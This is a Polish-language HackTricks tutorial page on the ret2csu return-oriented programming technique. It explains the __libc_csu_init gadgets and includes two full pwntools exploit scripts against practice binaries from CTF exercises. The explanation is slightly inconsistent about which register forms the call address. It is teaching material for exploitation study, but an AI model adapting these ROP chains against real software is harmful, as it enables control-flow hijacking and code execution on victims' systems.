# Ret2csu

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

##

## [https://www.scs.stanford.edu/brop/bittau-brop.pdf](https://www.scs.stanford.edu/brop/bittau-brop.pdf)Podstawowe informacje

**ret2csu** to technika hackingowa używana, gdy próbujesz przejąć kontrolę nad programem, ale nie możesz znaleźć **gadżetów**, których zwykle używasz do manipulowania zachowaniem programu.

Gdy program korzysta z określonych bibliotek (takich jak libc), ma wbudowane funkcje do zarządzania tym, jak różne części programu komunikują się ze sobą. Wśród tych funkcji znajdują się ukryte skarby, które mogą działać jako nasze brakujące gadżety, szczególnie jeden zwany `__libc_csu_init`.

### Magiczne Gadżety w \_\_libc\_csu\_init

W **`__libc_csu_init`** znajdują się dwie sekwencje instrukcji (gadżetów), które warto wyróżnić:

1. Pierwsza sekwencja pozwala nam ustawić wartości w kilku rejestrach (rbx, rbp, r12, r13, r14, r15). Są to jakby sloty, w których możemy przechowywać liczby lub adresy, które chcemy wykorzystać później.
```armasm
pop rbx;
pop rbp;
pop r12;
pop r13;
pop r14;
pop r15;
ret;
```
Ten gadżet pozwala nam kontrolować te rejestry, wypychając wartości ze stosu do nich.

2. Druga sekwencja wykorzystuje wartości, które ustawiliśmy, aby wykonać kilka rzeczy:
* **Przenieś konkretne wartości do innych rejestrów**, przygotowując je do użycia jako parametry w funkcjach.
* **Wykonaj wywołanie do lokalizacji** określonej przez dodanie wartości w r15 i rbx, a następnie pomnożenie rbx przez 8.
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
```
3. Może nie znasz żadnego adresu, aby tam zapisać i **potrzebujesz instrukcji `ret`**. Zauważ, że drugi gadżet również **kończy się na `ret`**, ale będziesz musiał spełnić pewne **warunki**, aby do niego dotrzeć:
```armasm
mov rdx, r15;
mov rsi, r14;
mov edi, r13d;
call qword [r12 + rbx*8];
add rbx, 0x1;
cmp rbp, rbx
jnz <func>
...
ret
```
Warunki będą następujące:

* `[r12 + rbx*8]` musi wskazywać na adres przechowujący wywoływalną funkcję (jeśli nie ma pomysłu i nie ma pie, można po prostu użyć funkcji `_init`):
* Jeśli \_init jest na `0x400560`, użyj GEF, aby wyszukać wskaźnik w pamięci do niego i sprawić, aby `[r12 + rbx*8]` był adresem z wskaźnikiem do \_init:
```bash
# Example from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
gef➤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
0x400e38 - 0x400e44  →   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
0x600e38 - 0x600e44  →   "\x60\x05\x40[...]"
```
* `rbp` i `rbx` muszą mieć tę samą wartość, aby uniknąć skoku
* Istnieją pewne pominięte pops, które musisz wziąć pod uwagę

## RDI i RSI

Innym sposobem na kontrolowanie **`rdi`** i **`rsi`** z gadżetu ret2csu jest dostęp do konkretnych offsetów:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="283"><figcaption><p><a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>

Sprawdź tę stronę po więcej informacji:

{% content-ref url="brop-blind-return-oriented-programming.md" %}
[brop-blind-return-oriented-programming.md](brop-blind-return-oriented-programming.md)
{% endcontent-ref %}

## Przykład

### Używając wywołania

Wyobraź sobie, że chcesz wykonać syscall lub wywołać funkcję taką jak `write()`, ale potrzebujesz konkretnych wartości w rejestrach `rdx` i `rsi` jako parametrów. Zwykle szukałbyś gadżetów, które bezpośrednio ustawiają te rejestry, ale nie możesz znaleźć żadnych.

Tutaj wchodzi w grę **ret2csu**:

1. **Ustaw rejestry**: Użyj pierwszego magicznego gadżetu, aby zrzucić wartości ze stosu do rbx, rbp, r12 (edi), r13 (rsi), r14 (rdx) i r15.
2. **Użyj drugiego gadżetu**: Gdy te rejestry są ustawione, używasz drugiego gadżetu. To pozwala ci przenieść wybrane wartości do `rdx` i `rsi` (z r14 i r13, odpowiednio), przygotowując parametry do wywołania funkcji. Co więcej, kontrolując `r15` i `rbx`, możesz sprawić, że program wywoła funkcję znajdującą się pod adresem, który obliczysz i umieścisz w `[r15 + rbx*8]`.

Masz [**przykład używający tej techniki i wyjaśniający to tutaj**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), a to jest ostateczny exploit, który wykorzystano:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

POP_CHAIN = 0x00401224 # pop r12, r13, r14, r15, ret
REG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]
RW_LOC = 0x00404028

rop.raw('A' * 40)
rop.gets(RW_LOC)
rop.raw(POP_CHAIN)
rop.raw(0)                      # r12
rop.raw(0)                      # r13
rop.raw(0xdeadbeefcafed00d)     # r14 - popped into RDX!
rop.raw(RW_LOC)                 # r15 - holds location of called function!
rop.raw(REG_CALL)               # all the movs, plus the call

p.sendlineafter('me\n', rop.chain())
p.sendline(p64(elf.sym['win']))            # send to gets() so it's written
print(p.recvline())                        # should receive "Awesome work!"
```
{% hint style="warning" %}
Zauważ, że poprzedni exploit nie ma na celu uzyskania **`RCE`**, ma na celu jedynie wywołanie funkcji o nazwie **`win`** (biorąc adres `win` z stdin wywołując gets w łańcuchu ROP i przechowując go w r15) z trzecim argumentem o wartości `0xdeadbeefcafed00d`.
{% endhint %}

### Ominięcie wywołania i dotarcie do ret

Następujący exploit został wyodrębniony [**z tej strony**](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html), gdzie używany jest **ret2csu**, ale zamiast używać wywołania, **omija porównania i dociera do `ret`** po wywołaniu:
```python
# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX

# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```
### Dlaczego nie używać bezpośrednio libc?

Zazwyczaj te przypadki są również podatne na [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) + [**ret2lib**](ret2lib/), ale czasami musisz kontrolować więcej parametrów, niż można łatwo kontrolować za pomocą gadżetów, które znajdziesz bezpośrednio w libc. Na przykład funkcja `write()` wymaga trzech parametrów, a **znalezienie gadżetów do ustawienia wszystkich tych parametrów bezpośrednio może być niemożliwe**.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
